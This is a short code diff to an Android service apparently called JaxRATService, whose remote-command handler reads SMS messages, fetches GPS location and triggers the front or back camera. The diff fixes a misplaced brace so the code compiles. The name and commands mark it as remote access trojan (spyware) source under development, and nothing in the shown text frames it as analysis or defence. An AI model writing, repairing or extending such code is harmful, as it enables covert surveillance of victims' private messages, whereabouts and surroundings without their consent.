@@ -1,5 +1,4 @@
 package com.ezax.agent;
-
 import android.app.AlarmManager;
 import android.app.Notification;
 import android.app.NotificationChannel;
@@ -131,7 +130,7 @@ public class JaxRATService extends Service {
             ambilGps();
         } else if (cmd.equals("get_sms")) {
             ambilSms();
-        }} else if (cmd.equals("camera_front") || cmd.equals("camera_back")) {
+        } else if (cmd.equals("camera_front") || cmd.equals("camera_back")) {
     Intent camIntent = new Intent(this, CameraActivity.class);
     camIntent.putExtra("FRONT", cmd.equals("camera_front"));
     camIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
